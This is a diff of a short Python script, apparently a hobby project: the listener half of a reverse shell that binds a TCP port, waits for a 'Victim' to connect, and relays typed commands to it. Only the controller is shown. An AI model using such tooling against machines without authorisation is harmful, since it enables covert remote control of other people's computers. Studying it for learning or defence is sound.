@@ -1,35 +1,35 @@
-#the Server program to demonstrate the Reverse Shell 
-#The Socket is the end point of a Network Connection !
-import socket 
-HOST=''
-#the port must be in the range of 0-65535(0-1024 reserved)
-PORT=9100
+#The Server program will be used to control the Victim via the network
+import socket
+import os
+import sys
+#used for ASCII Art !
+import pyfiglet
+
+whose_tunnel=pyfiglet.figlet_format('Whose Tunnel')
+print(whose_tunnel)
+print('-'*100)
+#preventing hardcoded address !
+HOST=socket.gethostbyname(socket.gethostname())
+#choosing a port number between 0-65535(reserved ones are between 0-1023)
+PORT=55555
 try:
-	print('Establishing a TCP Connection !')
-	soc=socket.socket()
-	#now we have to bind the ip address to the port number !
-	#the function parameter for the bind method is a tuple
-	print(f'Binding to the Port {PORT}')
-	soc.bind((HOST,PORT))
-	#this implies how many computers can wait for the sever prior to timeout
-	soc.listen(5)
-	#now we have to accept the connection from the client !(target machine )
-	print('Waiting for Someone to Connect !')
-	conn,addr=soc.accept()
-	print(f'Now we \'re connected to IP: {addr[0]} and Listening On Port: {addr[1]}')
+	#creating a tcp socket !
+	server=socket.socket()
+	print(f'Binding the IP address: {HOST} to the Port: {PORT}')
+	server.bind((HOST,PORT))
+	print('Listening to 3 Clients without network timeout !')
+	server.listen(3)
+	print('The Server is now ready accept Connections...........')
+	conn,addr=server.accept()
+	print(f'Connected to {addr[0]} which is on {addr[1]} !')
+	#the message object !
 	cmd=''
-	print('Ready to Chat !')
 	while True:
 		if cmd.lower()=='quit':
 			conn.close()
-			soc.close()
-			print('Bye Client !')
 			break
 		cmd=input('>>')
-		print('Server: ',cmd)
 		conn.send(cmd.encode())
-		print('Client: ',conn.recv(1024).decode())
-	print('Client Be Like:',conn.recv(1024).decode())
-except socket.error as s_err:
-	print('The Socket Creation Error !'+str(s_err))
-
+		print(conn.recv(1024).decode())
+except Exception as e:
+	print(f'The Socket Stream Met With An Error: {e}')
